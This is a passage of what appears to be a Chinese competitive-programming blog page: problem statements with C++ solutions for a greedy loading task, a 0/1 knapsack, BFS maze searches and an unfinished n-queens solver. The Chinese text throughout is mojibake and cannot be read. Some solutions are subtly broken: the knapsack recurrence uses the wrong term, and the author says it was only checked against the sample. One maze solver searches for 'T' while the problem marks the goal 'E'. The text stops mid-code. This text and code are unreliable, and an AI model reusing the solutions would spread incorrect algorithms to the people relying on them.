class="hljs-function"><span class="hljs-keyword">int</span> <span class="hljs-title">main</span><span class="hljs-params">()</span></span><span class="hljs-function"></span>&#123;<span class="hljs-keyword">int</span> n;<span class="hljs-built_in">cin</span>&gt;&gt;n; <span class="hljs-keyword">while</span>(n--)&#123;<span class="hljs-keyword">int</span> m,sum;<span class="hljs-built_in">cin</span>&gt;&gt;m;sum=<span class="hljs-number">0</span>;<span class="hljs-keyword">while</span>(m&gt;<span class="hljs-number">3</span>)&#123;m=m<span class="hljs-number">-2</span>;sum=sum+<span class="hljs-number">3</span>;&#125;<span class="hljs-keyword">if</span>(m==<span class="hljs-number">3</span>)sum+=<span class="hljs-number">4</span>;<span class="hljs-keyword">else</span>sum=m;<span class="hljs-built_in">cout</span>&lt;&lt;sum&lt;&lt;<span class="hljs-built_in">endl</span>; &#125;<span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;&#125;</code></pre></div><h2 id="é—®é¢˜-D-æµ·ä¹‹å¾é€”â€”â€”å­™ç­–"><a href="#é—®é¢˜-D-æµ·ä¹‹å¾é€”â€”â€”å­™ç­–" class="headerlink" title="é—®é¢˜ D: æµ·ä¹‹å¾é€”â€”â€”å­™ç­–"></a>é—®é¢˜ D: æµ·ä¹‹å¾é€”â€”â€”å­™ç­–</h2><h3 id="é¢˜ç›®æè¿°-3"><a href="#é¢˜ç›®æè¿°-3" class="headerlink" title="é¢˜ç›®æè¿°"></a>é¢˜ç›®æè¿°</h3><p>å­™ç­–æ˜¯ç‹è€…å³¡è°·é‡Œçš„å¦å…‹/æˆ˜å£«ã€‚å¤§èˆ¹é å²¸ï¼Œæ±Ÿéƒ¡æ¬¢å‘¼ç€è¿æ¥äº†ä»–ä»¬çš„æ–°é¢†è¢–ï¼Œäººç§°æ±Ÿä¸œå°éœ¸ç‹çš„å¹´è½»äººã€‚æ¸¸æˆä¸­ï¼Œå­™ç­–çš„æŠ€èƒ½é•¿å¸†ç ´æµªï¼Œå¯ä»¥é©¾èˆ¹å†²é”‹ï¼Œå¯å°†èˆ¹æ’å‘æ•Œæ–¹å•ä½æˆ–è€…é˜»æŒ¡ç‰©ï¼Œå¹¶é€ æˆä¸€å®šçš„ä¼¤å®³ã€‚</p><p>ç°åœ¨ï¼Œæœ‰ä¸€ç¾¤å¥½å¥‡çš„æ±Ÿéƒ¡å°æœ‹å‹æƒ³è·Ÿç€å­™ç­–ä¸€èµ·å‡ºæµ·èˆªè¡Œï¼Œä½†å­™ç­–çš„èˆ¹æ‰¿è½½ä¸äº†æ‰€æœ‰å°æœ‹å‹ï¼Œæ‰€ä»¥å­™ç­–å†³å®šï¼Œå°½å¯èƒ½å¸¦æ›´å¤šçš„å°æœ‹å‹å‡ºæµ·ï¼Œç°åœ¨è¯·ä½ å¸®å­™ç­–è°‹ä¸€ä¸ªç­–ç•¥ï¼Œä½¿å¾—æ›´å¤šçš„å°æœ‹å‹æœ‰æœºä¼šå‡ºæµ·èˆªè¡Œã€‚å·²çŸ¥çš„æ¡ä»¶æ˜¯å­™ç­–èˆ¹çš„æœ€å¤§è½½é‡mï¼Œä»¥åŠnä¸ªå°æœ‹å‹çš„ä½“é‡ã€‚</p><h3 id="è¾“å…¥-3"><a href="#è¾“å…¥-3" class="headerlink" title="è¾“å…¥"></a>è¾“å…¥</h3><p>å¤šç»„æµ‹è¯•ç”¨ä¾‹ã€‚<br>ç¬¬ä¸€è¡Œè¾“å…¥åŒ…å«ä¸€ä¸ªæ•´æ•°Tï¼ˆ1&lt;=T&lt;=1000ï¼‰ï¼Œä»£è¡¨æµ‹è¯•ç”¨ä¾‹ä¸ªæ•°ã€‚</p><p>æ¯ç»„æµ‹è¯•ç”¨ä¾‹ç¬¬ä¸€è¡Œæœ‰ä¸¤ä¸ªæ•´æ•°må’Œnã€‚ï¼ˆ0&lt;=m&lt;=1000ï¼Œ 0&lt;=n&lt;=1000ï¼‰ï¼Œåˆ†åˆ«ä»£è¡¨èˆ¹çš„è½½é‡é‡é‡å’Œå°æœ‹å‹çš„ä¸ªæ•°ï¼Œæ¥ä¸‹æ¥ä¸€è¡Œä¸ºnä¸ªå°æœ‹å‹çš„ä½“é‡ã€‚</p><h3 id="è¾“å‡º-3"><a href="#è¾“å‡º-3" class="headerlink" title="è¾“å‡º"></a>è¾“å‡º</h3><p>æ¯ç»„æµ‹è¯•ç”¨ä¾‹å¯¹åº”ä¸€è¡Œè¾“å‡ºï¼Œæ¯è¡Œè¾“å‡ºä¸€ä¸ªæ•´æ•°ansï¼Œä»£è¡¨æœ€å¤šèƒ½æœ‰ansä¸ªå°æœ‹å‹è·Ÿç€ä¸€èµ·å‡ºæµ·ã€‚</p><h3 id="æ ·ä¾‹è¾“å…¥-3"><a href="#æ ·ä¾‹è¾“å…¥-3" class="headerlink" title="æ ·ä¾‹è¾“å…¥"></a>æ ·ä¾‹è¾“å…¥</h3><div class="hljs"><pre><code class="hljs basic"><span class="hljs-number">2</span><span class="hljs-symbol">10 </span><span class="hljs-number">4</span><span class="hljs-symbol">3 </span><span class="hljs-number">5</span> <span class="hljs-number">2</span> <span class="hljs-number">4</span><span class="hljs-symbol">20 </span><span class="hljs-number">9</span><span class="hljs-symbol">3 </span><span class="hljs-number">5</span> <span class="hljs-number">2</span> <span class="hljs-number">4</span> <span class="hljs-number">6</span> <span class="hljs-number">1</span> <span class="hljs-number">8</span> <span class="hljs-number">5</span> <span class="hljs-number">9</span></code></pre></div><h3 id="æ ·ä¾‹è¾“å‡º-3"><a href="#æ ·ä¾‹è¾“å‡º-3" class="headerlink" title="æ ·ä¾‹è¾“å‡º"></a>æ ·ä¾‹è¾“å‡º</h3><div class="hljs"><pre><code class="hljs angelscript"><span class="hljs-number">3</span><span class="hljs-number">6</span></code></pre></div><h3 id="æç¤º-3"><a href="#æç¤º-3" class="headerlink" title="æç¤º"></a>æç¤º</h3><p>å°±æ˜¯ç®€å•çš„è£…åœ¨é—®é¢˜</p><div class="hljs"><pre><code class="hljs c++"><span class="hljs-meta">#<span class="hljs-meta-keyword">include</span><span class="hljs-meta-string">&lt;bits/stdc++.h&gt;</span></span><span class="hljs-keyword">using</span> <span class="hljs-keyword">namespace</span> <span class="hljs-built_in">std</span>;<span class="hljs-keyword">int</span> T,m,n;<span class="hljs-keyword">int</span> w[<span class="hljs-number">1005</span>];<span class="hljs-function"><span class="hljs-keyword">int</span> <span class="hljs-title">main</span><span class="hljs-params">()</span></span><span class="hljs-function"></span>&#123;<span class="hljs-built_in">cin</span>&gt;&gt;T;<span class="hljs-keyword">while</span>(T--)&#123;<span class="hljs-keyword">int</span> ans=<span class="hljs-number">0</span>;<span class="hljs-built_in">cin</span>&gt;&gt;m&gt;&gt;n;<span class="hljs-keyword">for</span>(<span class="hljs-keyword">int</span> i=<span class="hljs-number">0</span>;i&lt;n;i++)&#123;<span class="hljs-built_in">cin</span>&gt;&gt;w[i];&#125;sort(w,w+n);<span class="hljs-keyword">for</span>(<span class="hljs-keyword">int</span> i=<span class="hljs-number">0</span>;i&lt;n;i++)&#123;<span class="hljs-keyword">if</span>(m&gt;=w[i])&#123;ans++;m-=w[i];&#125;<span class="hljs-keyword">else</span><span class="hljs-keyword">break</span>; &#125; <span class="hljs-built_in">cout</span>&lt;&lt;ans&lt;&lt;<span class="hljs-built_in">endl</span>;&#125;<span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;&#125;</code></pre></div><h2 id="é—®é¢˜-E-æå†°é˜²å¾¡â€”â€”ç›¾å±±"><a href="#é—®é¢˜-E-æå†°é˜²å¾¡â€”â€”ç›¾å±±" class="headerlink" title="é—®é¢˜ E: æå†°é˜²å¾¡â€”â€”ç›¾å±±"></a>é—®é¢˜ E: æå†°é˜²å¾¡â€”â€”ç›¾å±±</h2><h3 id="é¢˜ç›®æè¿°-4"><a href="#é¢˜ç›®æè¿°-4" class="headerlink" title="é¢˜ç›®æè¿°"></a>é¢˜ç›®æè¿°</h3><p>ç›¾å±±æ˜¯ç‹è€…å³¡è°·é‡Œçš„è¾…åŠ©ï¼Œä¸€å¤«å½“å…³ã€ä¸‡å¤«è«å¼€ï¼Œä¸€ä¸ªå¥½çš„è¾…åŠ©å¾€å¾€å¯ä»¥ç»™å›¢é˜Ÿå¸¦æ¥æå¤§å¸®åŠ©ã€‚</p><p>ç›¾å±±çš„æ¸¸æˆä¸­çš„ä¸€ä¸ªæŠ€èƒ½ä¸ºä¸åŠ¨å¦‚å±±ï¼šæ‰‹æ¡ä¸€å—ç”±çŸ³å¤´ç»„æˆçš„å·¨ç›¾ï¼Œå¼ å¼€å·¨ç›¾ç ¸å‘åœ°é¢ï¼Œå°†æ•Œäººæ¨å¼€ï¼Œå¹¶æŒç»­ä¸€æ®µæ—¶é—´ã€‚</p><p>å‡è®¾ç›¾å±±æœ€å¤šåªèƒ½æ‰¿å—Cé‡é‡çš„ç›¾ç‰Œï¼Œè€Œç°åœ¨æœ‰Nä¸ªå°çŸ³å¤´ï¼Œæ¯ä¸ªçŸ³å¤´içš„é‡é‡ä¸ºWiï¼Œé˜²å¾¡å€¼ä¸ºPiã€‚é‚£ä¹ˆï¼Œå‘†èŒçš„ç›¾å±±æƒ³çŸ¥é“ï¼Œä»–ä»Nä¸ªå°çŸ³å¤´ä¸­æŒ‘é€‰Mä¸ªï¼ˆM&lt;=Nï¼‰ç»„æˆä»–å¯æ‰¿å—ç›¾ç‰Œï¼Œæœ€å¤§çš„é˜²å¾¡å€¼æ˜¯å¤šå°‘ï¼Ÿ</p><h3 id="è¾“å…¥-4"><a href="#è¾“å…¥-4" class="headerlink" title="è¾“å…¥"></a>è¾“å…¥</h3><p>å¤šç»„æµ‹è¯•ç”¨ä¾‹ã€‚<br>ç¬¬ä¸€è¡Œè¾“å…¥åŒ…å«ä¸€ä¸ªæ•´æ•°Tï¼ˆ1&lt;=T&lt;=10ï¼‰ï¼Œä»£è¡¨æµ‹è¯•ç”¨ä¾‹ä¸ªæ•°ã€‚</p><p>æ¥ä¸‹æ¥æœ‰Tç»„æµ‹è¯•ç”¨ä¾‹ã€‚æ¯ç»„æµ‹è¯•ç”¨ä¾‹ç¬¬ä¸€è¡Œä¸ºç›¾å±±æ‰¿å—ç›¾ç‰Œçš„æœ€å¤§é‡é‡C(C&lt;10000)å’Œå°çŸ³å¤´çš„ä¸ªæ•°N(N&lt;1000)ã€‚æ¥ä¸‹æ¥çš„Nè¡Œåˆ†åˆ«ä¸ºå°çŸ³å¤´çš„é‡é‡Wi(1&lt;=Wi&lt;=100)å’Œé˜²å¾¡å€¼Pi(1&lt;=Pi&lt;=3000000)ã€‚</p><h3 id="è¾“å‡º-4"><a href="#è¾“å‡º-4" class="headerlink" title="è¾“å‡º"></a>è¾“å‡º</h3><p>æ¯ç»„æµ‹è¯•ç”¨ä¾‹å¯¹åº”ä¸€è¡Œè¾“å‡ºï¼Œæ¯è¡Œè¾“å‡ºä¸€ä¸ªæ•´æ•°ansï¼Œä»£è¡¨å¯æ‰¿å—ç›¾ç‰Œçš„æœ€å¤§é˜²å¾¡å€¼ã€‚</p><h3 id="æ ·ä¾‹è¾“å…¥-4"><a href="#æ ·ä¾‹è¾“å…¥-4" class="headerlink" title="æ ·ä¾‹è¾“å…¥"></a>æ ·ä¾‹è¾“å…¥</h3><div class="hljs"><pre><code class="hljs basic"><span class="hljs-number">1</span><span class="hljs-symbol">10 </span><span class="hljs-number">5</span><span class="hljs-symbol">2 </span><span class="hljs-number">6</span><span class="hljs-symbol">2 </span><span class="hljs-number">3</span><span class="hljs-symbol">6 </span><span class="hljs-number">5</span><span class="hljs-symbol">5 </span><span class="hljs-number">4</span><span class="hljs-symbol">4 </span><span class="hljs-number">6</span></code></pre></div><h3 id="æ ·ä¾‹è¾“å‡º-4"><a href="#æ ·ä¾‹è¾“å‡º-4" class="headerlink" title="æ ·ä¾‹è¾“å‡º"></a>æ ·ä¾‹è¾“å‡º</h3><div class="hljs"><pre><code class="hljs angelscript"><span class="hljs-number">15</span></code></pre></div><h3 id="æç¤º-4"><a href="#æç¤º-4" class="headerlink" title="æç¤º"></a>æç¤º</h3><p>01èƒŒåŒ…é—®é¢˜ï¼Œä¸çŸ¥é“ä¸‹é¢çš„è§£èƒ½ä¸èƒ½è¿‡</p><div class="hljs"><pre><code class="hljs c++"><span class="hljs-meta">#<span class="hljs-meta-keyword">include</span><span class="hljs-meta-string">&lt;bits/stdc++.h&gt;</span></span><span class="hljs-keyword">using</span> <span class="hljs-keyword">namespace</span> <span class="hljs-built_in">std</span>;<span class="hljs-keyword">const</span> <span class="hljs-keyword">int</span> N=<span class="hljs-number">1e5</span>+<span class="hljs-number">5</span>;<span class="hljs-keyword">long</span> <span class="hljs-keyword">long</span> ans[N];<span class="hljs-keyword">int</span> w[N],v[N];<span class="hljs-keyword">int</span> T;<span class="hljs-function"><span class="hljs-keyword">int</span> <span class="hljs-title">main</span><span class="hljs-params">()</span></span><span class="hljs-function"></span>&#123;<span class="hljs-built_in">cin</span>&gt;&gt;T;<span class="hljs-keyword">while</span>(T--)&#123;<span class="hljs-keyword">int</span> C,N;<span class="hljs-built_in">memset</span>(ans,<span class="hljs-number">0</span>,<span class="hljs-keyword">sizeof</span>(ans));<span class="hljs-built_in">cin</span>&gt;&gt;C&gt;&gt;N;<span class="hljs-keyword">for</span>(<span class="hljs-keyword">int</span> i=<span class="hljs-number">0</span>;i&lt;N;i++)&#123;<span class="hljs-built_in">cin</span>&gt;&gt;w[i]&gt;&gt;v[i];&#125;<span class="hljs-keyword">for</span>(<span class="hljs-keyword">int</span> i=<span class="hljs-number">0</span>;i&lt;N;i++)&#123;<span class="hljs-keyword">for</span>(<span class="hljs-keyword">int</span> j=C;j&gt;=w[i];j--)ans[j]=<span class="hljs-built_in">max</span>(ans[j<span class="hljs-number">-1</span>],ans[j-w[i]]+v[i]);&#125;<span class="hljs-comment">//for(int i=0;i&lt;=C;i++)</span><span class="hljs-comment">//cout&lt;&lt;ans[i]&lt;&lt;endl;</span><span class="hljs-built_in">cout</span>&lt;&lt;ans[C]&lt;&lt;<span class="hljs-built_in">endl</span>;&#125; <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;&#125;</code></pre></div><p>ps:ä»¥ä¸Šä»£ç æ²¡æœ‰æäº¤æµ‹è¯•ç¯å¢ƒï¼Œåªæ˜¯è¿‡äº†ç»™å‡ºçš„æµ‹è¯•æ ·ä¾‹ã€‚</p><h1 id="dfså¤§åˆé›†"><a href="#dfså¤§åˆé›†" class="headerlink" title="dfså¤§åˆé›†"></a>dfså¤§åˆé›†</h1><h2 id="è¿·å®«é—®é¢˜"><a href="#è¿·å®«é—®é¢˜" class="headerlink" title="è¿·å®«é—®é¢˜"></a>è¿·å®«é—®é¢˜</h2><h3 id="é¢˜ç›®æè¿°-5"><a href="#é¢˜ç›®æè¿°-5" class="headerlink" title="é¢˜ç›®æè¿°"></a>é¢˜ç›®æè¿°</h3><p>å°æ˜ç½®èº«äºä¸€ä¸ªè¿·å®«ï¼Œè¯·ä½ å¸®å°æ˜æ‰¾å‡ºä»èµ·ç‚¹åˆ°ç»ˆç‚¹çš„æœ€çŸ­è·¯ç¨‹ã€‚<br>å°æ˜åªèƒ½å‘ä¸Šä¸‹å·¦å³å››ä¸ªæ–¹å‘ç§»åŠ¨ã€‚</p><p>è¾“å…¥</p><p>è¾“å…¥åŒ…å«å¤šç»„æµ‹è¯•æ•°æ®ã€‚è¾“å…¥çš„ç¬¬ä¸€è¡Œæ˜¯ä¸€ä¸ªæ•´æ•°Tï¼Œè¡¨ç¤ºæœ‰Tç»„æµ‹è¯•æ•°æ®ã€‚<br>æ¯ç»„è¾“å…¥çš„ç¬¬ä¸€è¡Œæ˜¯ä¸¤ä¸ªæ•´æ•°Nå’ŒMï¼ˆ1&lt;=N,M&lt;=100ï¼‰ã€‚<br>æ¥ä¸‹æ¥Nè¡Œï¼Œæ¯è¡Œè¾“å…¥Mä¸ªå­—ç¬¦ï¼Œæ¯ä¸ªå­—ç¬¦è¡¨ç¤ºè¿·å®«ä¸­çš„ä¸€ä¸ªå°æ–¹æ ¼ã€‚<br>å­—ç¬¦çš„å«ä¹‰å¦‚ä¸‹ï¼š<br>â€˜Sâ€™ï¼šèµ·ç‚¹<br>â€˜Eâ€™ï¼šç»ˆç‚¹<br>â€˜-â€™ï¼šç©ºåœ°ï¼Œå¯ä»¥é€šè¿‡<br>â€˜#â€™ï¼šéšœç¢ï¼Œæ— æ³•é€šè¿‡<br>è¾“å…¥æ•°æ®ä¿è¯æœ‰ä¸”ä»…æœ‰ä¸€ä¸ªèµ·ç‚¹å’Œç»ˆç‚¹ã€‚</p><p>è¾“å‡º</p><p>å¯¹äºæ¯ç»„è¾“å…¥ï¼Œè¾“å‡ºä»èµ·ç‚¹åˆ°ç»ˆç‚¹çš„æœ€çŸ­è·¯ç¨‹ï¼Œå¦‚æœä¸å­˜åœ¨ä»èµ·ç‚¹åˆ°ç»ˆç‚¹çš„è·¯ï¼Œåˆ™è¾“å‡º-1ã€‚</p><h3 id="æ ·ä¾‹è¾“å…¥-5"><a href="#æ ·ä¾‹è¾“å…¥-5" class="headerlink" title="æ ·ä¾‹è¾“å…¥"></a>æ ·ä¾‹è¾“å…¥</h3><div class="hljs"><pre><code class="hljs asciidoc">15 5s-###-----##---E#------##</code></pre></div><h3 id="æ ·ä¾‹è¾“å‡º-5"><a href="#æ ·ä¾‹è¾“å‡º-5" class="headerlink" title="æ ·ä¾‹è¾“å‡º"></a>æ ·ä¾‹è¾“å‡º</h3><div class="hljs"><pre><code class="hljs angelscript"><span class="hljs-number">9</span></code></pre></div><div class="hljs"><pre><code class="hljs c++"><span class="hljs-meta">#<span class="hljs-meta-keyword">include</span><span class="hljs-meta-string">&lt;iostream&gt;</span></span><span class="hljs-meta">#<span class="hljs-meta-keyword">include</span><span class="hljs-meta-string">&lt;cstring&gt;</span></span><span class="hljs-meta">#<span class="hljs-meta-keyword">include</span><span class="hljs-meta-string">&lt;string&gt;</span></span><span class="hljs-meta">#<span class="hljs-meta-keyword">include</span><span class="hljs-meta-string">&lt;queue&gt;</span></span><span class="hljs-meta">#<span class="hljs-meta-keyword">include</span> <span class="hljs-meta-string">&lt;algorithm&gt;</span></span><span class="hljs-keyword">using</span> <span class="hljs-keyword">namespace</span> <span class="hljs-built_in">std</span>;<span class="hljs-keyword">int</span> de[<span class="hljs-number">100</span>][<span class="hljs-number">100</span>];<span class="hljs-comment">//è®¡æ­¥æ•°ç»„  è®°å½•èµ°åˆ°è¿™ä¸ªä½ç½®æ‰€éœ€çš„æ­¥æ•° ä¸èƒ½èµ°åˆ°çš„ä½ç½®æ ‡è®°ä¸º-1 </span><span class="hljs-keyword">char</span> <span class="hljs-built_in">map</span>[<span class="hljs-number">100</span>][<span class="hljs-number">100</span>];  <span class="hljs-comment">//ç”¨äºå­˜æ”¾è¿·å®«åœ°å›¾ </span><span class="hljs-keyword">typedef</span> pair&lt;<span class="hljs-keyword">int</span>,<span class="hljs-keyword">int</span>&gt; P;  <span class="hljs-comment">//åæ ‡</span><span class="hljs-keyword">int</span> to[<span class="hljs-number">2</span>][<span class="hljs-number">4</span>]=&#123;<span class="hljs-number">1</span>,<span class="hljs-number">-1</span>,<span class="hljs-number">0</span>,<span class="hljs-number">0</span>,<span class="hljs-number">0</span>,<span class="hljs-number">0</span>,<span class="hljs-number">1</span>,<span class="hljs-number">-1</span>&#125;;  <span class="hljs-comment">//åœ¨å½“å‰åæ ‡ä¸‹èƒ½èµ°çš„å››ä¸ªæ–¹å‘</span><span class="hljs-keyword">int</span> sx,ex,sy,ey;  <span class="hljs-comment">//(sx,sy)ä¸ºèµ·ç‚¹åæ ‡  ï¼ˆex,eyï¼‰ä¸ºç»ˆç‚¹åæ ‡</span><span class="hljs-keyword">int</span> x,y,nx,ny; <span class="hljs-comment">//(x,y)ä¸ºå‡½æ•°ä¸­å½“å‰ä½ç½®åæ ‡   ï¼ˆnx,ny)ä¸ºæ¥ä¸‹æ¥èƒ½åˆ°è¾¾çš„åæ ‡ </span><span class="hljs-keyword">int</span> r,l;  <span class="hljs-comment">//rä¸ºè¡Œæ•° lä¸ºåˆ—æ•° </span><span class="hljs-function"><span class="hljs-keyword">int</span> <span class="hljs-title">bfs</span><span class="hljs-params">()</span></span><span class="hljs-function"></span>&#123;<span class="hljs-built_in">memset</span>(de,<span class="hljs-number">-1</span>,<span class="hljs-keyword">sizeof</span>(de));<span class="hljs-built_in">queue</span>&lt;P&gt; qu;qu.push(P(sx,sy));   <span class="hljs-comment">//å°†èµ·ç‚¹åæ ‡æ”¾å…¥é˜Ÿå¤´ </span>de[sx][sy]=<span class="hljs-number">0</span>;<span class="hljs-keyword">while</span>(!qu.empty()) &#123;P p=qu.front();   <span class="hljs-comment">//å–å‡ºé˜Ÿå¤´åæ ‡ </span>qu.pop() ;<span class="hljs-comment">//åˆ é™¤å¯¹å¤´åŠèµ°è¿‡çš„åæ ‡ </span>x=p.first,y=p.second; <span class="hljs-keyword">if</span>(x==ex&amp;&amp;y==ey) <span class="hljs-keyword">break</span>; <span class="hljs-comment">//åˆ°è¾¾ç»ˆç‚¹ è·³å‡ºå¾ªç¯</span> <span class="hljs-keyword">for</span>(<span class="hljs-keyword">int</span> i=<span class="hljs-number">0</span>;i&lt;<span class="hljs-number">4</span>;i++)&#123;nx=x+to[<span class="hljs-number">0</span>][i];<span class="hljs-comment">//å¼€å§‹å‘å››ä¸ªæ–¹å‘ç§»åŠ¨ </span>ny=y+to[<span class="hljs-number">1</span>][i];<span class="hljs-keyword">if</span>(nx&gt;=<span class="hljs-number">0</span>&amp;&amp;nx&lt;r&amp;&amp;ny&gt;=<span class="hljs-number">0</span>&amp;&amp;ny&lt;l&amp;&amp;<span class="hljs-built_in">map</span>[nx][ny]!=<span class="hljs-string">'#'</span>&amp;&amp;de[nx][ny]==<span class="hljs-number">-1</span>) <span class="hljs-comment">//åˆ¤æ–­æ˜¯å¦è¶Šç•Œ ä»¥åŠæ˜¯å¦èƒ½èµ°  æ’é™¤èµ°è¿‡çš„è·¯ </span> &#123;     qu.push(P(nx,ny));      <span class="hljs-comment">//å°†èƒ½èµ°çš„åæ ‡æ”¾å…¥é˜Ÿåˆ— ä¹‹åä¾æ¬¡åˆ é™¤ </span>    de[nx][ny]=de[x][y]+<span class="hljs-number">1</span>;  <span class="hljs-comment">//æ­¥æ•°åŠ ä¸€ </span>&#125;   &#125;&#125;<span class="hljs-keyword">if</span>(de[ex][ey]==<span class="hljs-number">-1</span>)  <span class="hljs-keyword">return</span> <span class="hljs-number">-1</span>;  <span class="hljs-comment">//ç»ˆç‚¹çš„è®°æ­¥æ•°ç»„ä¸º-1 åŠä¸èƒ½åˆ°è¾¾ç»ˆç‚¹ </span><span class="hljs-keyword">else</span> <span class="hljs-keyword">return</span> de[ex][ey]; &#125; <span class="hljs-function"><span class="hljs-keyword">int</span> <span class="hljs-title">main</span><span class="hljs-params">()</span></span><span class="hljs-function"></span>&#123;<span class="hljs-keyword">int</span> n,i,j;<span class="hljs-keyword">while</span>(<span class="hljs-built_in">cin</span>&gt;&gt;n)&#123;<span class="hljs-keyword">while</span>(n--)&#123;<span class="hljs-built_in">cin</span>&gt;&gt;r&gt;&gt;l;<span class="hljs-keyword">for</span>(i=<span class="hljs-number">0</span>;i&lt;r;i++)&#123;<span class="hljs-keyword">for</span>(j=<span class="hljs-number">0</span>;j&lt;l;j++)&#123; <span class="hljs-built_in">cin</span>&gt;&gt;<span class="hljs-built_in">map</span>[i][j];<span class="hljs-keyword">if</span>(<span class="hljs-built_in">map</span>[i][j]==<span class="hljs-string">'S'</span>) <span class="hljs-comment">//è®°å½•èµ·ç‚¹åæ ‡ </span> &#123;sx=i,sy=j; &#125;  <span class="hljs-keyword">else</span> <span class="hljs-keyword">if</span>(<span class="hljs-built_in">map</span>[i][j]==<span class="hljs-string">'T'</span>)  <span class="hljs-comment">//è®°å½•ç»ˆç‚¹åæ ‡ </span> &#123; ex=i,ey=j; &#125;&#125;&#125;<span class="hljs-built_in">cout</span>&lt;&lt;bfs()&lt;&lt;<span class="hljs-built_in">endl</span>;&#125;&#125;<span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;&#125;</code></pre></div><h2 id="acwingè¿·å®«é—®é¢˜"><a href="#acwingè¿·å®«é—®é¢˜" class="headerlink" title="acwingè¿·å®«é—®é¢˜"></a>acwingè¿·å®«é—®é¢˜</h2><div class="hljs"><pre><code class="hljs c++"><span class="hljs-meta">#<span class="hljs-meta-keyword">include</span><span class="hljs-meta-string">&lt;bits/stdc++.h&gt;</span></span><span class="hljs-keyword">using</span> <span class="hljs-keyword">namespace</span> <span class="hljs-built_in">std</span>;<span class="hljs-keyword">const</span> <span class="hljs-keyword">int</span> N=<span class="hljs-number">105</span>;<span class="hljs-keyword">int</span> mp[N][N];<span class="hljs-keyword">int</span> dis[N][N];<span class="hljs-keyword">typedef</span> pair&lt;<span class="hljs-keyword">int</span>,<span class="hljs-keyword">int</span>&gt; P;<span class="hljs-keyword">int</span> n,m;<span class="hljs-keyword">int</span> to[<span class="hljs-number">2</span>][<span class="hljs-number">4</span>]=&#123;<span class="hljs-number">1</span>,<span class="hljs-number">-1</span>,<span class="hljs-number">0</span>,<span class="hljs-number">0</span>,<span class="hljs-number">0</span>,<span class="hljs-number">0</span>,<span class="hljs-number">1</span>,<span class="hljs-number">-1</span>&#125;;<span class="hljs-keyword">int</span> x,y,nx,ny;<span class="hljs-function"><span class="hljs-keyword">void</span> <span class="hljs-title">dfs</span><span class="hljs-params">()</span></span><span class="hljs-function"></span>&#123;<span class="hljs-built_in">memset</span>(dis,<span class="hljs-number">-1</span>,<span class="hljs-keyword">sizeof</span>(dis));<span class="hljs-built_in">queue</span>&lt;P&gt; qu;qu.push(P(<span class="hljs-number">0</span>,<span class="hljs-number">0</span>));dis[<span class="hljs-number">0</span>][<span class="hljs-number">0</span>]=<span class="hljs-number">0</span>;<span class="hljs-keyword">while</span>(!qu.empty())&#123;P p=qu.front();qu.pop();x=p.first,y=p.second;<span class="hljs-keyword">if</span>(x==n<span class="hljs-number">-1</span>&amp;&amp;y==m<span class="hljs-number">-1</span>) <span class="hljs-keyword">break</span>;<span class="hljs-keyword">for</span>(<span class="hljs-keyword">int</span> i=<span class="hljs-number">0</span>;i&lt;<span class="hljs-number">4</span>;i++)&#123;nx=x+to[<span class="hljs-number">0</span>][i],ny=y+to[<span class="hljs-number">1</span>][i];<span class="hljs-keyword">if</span>(nx&gt;=<span class="hljs-number">0</span>&amp;&amp;nx&lt;n&amp;&amp;ny&gt;=<span class="hljs-number">0</span>&amp;&amp;ny&lt;m&amp;&amp;dis[nx][ny]==<span class="hljs-number">-1</span>&amp;&amp;mp[nx][ny]==<span class="hljs-number">0</span>)&#123;qu.push(P(nx,ny));dis[nx][ny]=dis[x][y]+<span class="hljs-number">1</span>;&#125; &#125; &#125;<span class="hljs-keyword">if</span>(dis[n<span class="hljs-number">-1</span>][m<span class="hljs-number">-1</span>]!=<span class="hljs-number">-1</span>)<span class="hljs-built_in">cout</span>&lt;&lt;dis[n<span class="hljs-number">-1</span>][m<span class="hljs-number">-1</span>];<span class="hljs-keyword">return</span>; &#125;<span class="hljs-function"><span class="hljs-keyword">int</span> <span class="hljs-title">main</span><span class="hljs-params">()</span></span><span class="hljs-function"></span>&#123;<span class="hljs-built_in">cin</span>&gt;&gt;n&gt;&gt;m;<span class="hljs-keyword">for</span>(<span class="hljs-keyword">int</span> i=<span class="hljs-number">0</span>;i&lt;n;i++)<span class="hljs-keyword">for</span>(<span class="hljs-keyword">int</span> j=<span class="hljs-number">0</span>;j&lt;m;j++)<span class="hljs-built_in">cin</span>&gt;&gt;mp[i][j];dfs();<span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;&#125;</code></pre></div><h2 id="nçš‡åé—®é¢˜"><a href="#nçš‡åé—®é¢˜" class="headerlink" title="nçš‡åé—®é¢˜"></a>nçš‡åé—®é¢˜</h2><div class="hljs"><pre><code class="hljs c++"><span class="hljs-meta">#<span class="hljs-meta-keyword">include</span><span class="hljs-meta-string">&lt;bits/stdc++.h&gt;</span></span><span class="hljs-keyword">using</span> <span class="hljs-keyword">namespace</span> <span class="hljs-built_in">std</span>;<span class="hljs-keyword">int</span> n,ans=<span class="hljs-number">0</span>;<span class="hljs-keyword">const</span> <span class="hljs-keyword">int</span> N=<span class="hljs-number">20</span>;<span class="hljs-keyword">char</span> m[N][N];<span class="hljs-keyword">bool</span> col[N],dg[N],udg[N];<span class="hljs-function"><span class="hljs-keyword">void</span> <span class="hljs-title">dfs</span><span class="hljs-params">(<span class="hljs-keyword">int</span> u)</span></span><span class="hljs-function"></span>&#123;<span class="hljs-keyword">if</span>(u==n)&#123;<span class="hljs-comment">//for(int i=0;i&lt;n;i++)</span><span class="hljs-comment">//cout&lt;&lt;m[i]&lt;&lt;endl;</span>ans++;<span class="hljs-keyword">return</span>;&#125;<span class="hljs-keyword">for</span>(<span class="hljs-keyword">int</span> i=<span class="hljs-number">0</span>;i&lt;n;i++)&#123;<span class="hljs-keyword">if</span>(!col[i]&amp;&amp;!dg[i+u]&amp;&amp;!udg[n-u+i])&#123;m[u][i]=<span class="hljs-string">'Q'</span>;col[i]=dg[i+u]=udg[n-u+i]=<span class="hljs-number">1</span>;dfs(u+<span class="hljs-number">1</span>);col[i]=dg[i+u]=udg[n-u+i]=<span class="hljs-number">0</span>;<span class="hljs-comment">//å›æº¯æ¢å¤ç°åœº </span>m[u][i]=<span class="hljs-string">'.'</span>;&#125;&#125;&#125;<span class="hljs-function"><span class="hljs-keyword">int</span> <span class="hljs-title">main</span><span class="hljs-params">()</span></span><span class="hljs-function"></span>&#123;<span 